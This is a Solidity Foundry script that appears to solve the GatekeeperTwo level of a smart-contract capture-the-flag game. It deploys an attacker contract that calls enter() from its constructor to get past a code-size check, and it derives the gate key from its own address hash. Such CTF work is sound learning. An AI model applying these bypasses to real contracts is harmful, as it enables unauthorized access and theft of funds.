// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/14-GatekeeperTwo/GatekeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract ProxyAttcker {
    GatekeeperTwo gatekeeperInstance;

    constructor(GatekeeperTwo _gatekeeperInstance) {
        gatekeeperInstance = _gatekeeperInstance;
        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        console.log("res : ", gatekeeperInstance.enter(_gateKey));
    }
}

contract Level14Solution is Script {
    GatekeeperTwo gatekeeperInstance = GatekeeperTwo(0x3dA0C555D988358A7450eA1DEC44E2C0C8ddAd17);

    function run() public{
        vm.startBroadcast();
        
        ProxyAttcker proxyAttcker = new ProxyAttcker(gatekeeperInstance);
        
        console.log("tx.origin : ", tx.origin);
        console.log("enter : ", gatekeeperInstance.entrant());
        

        vm.stopBroadcast();
    }
}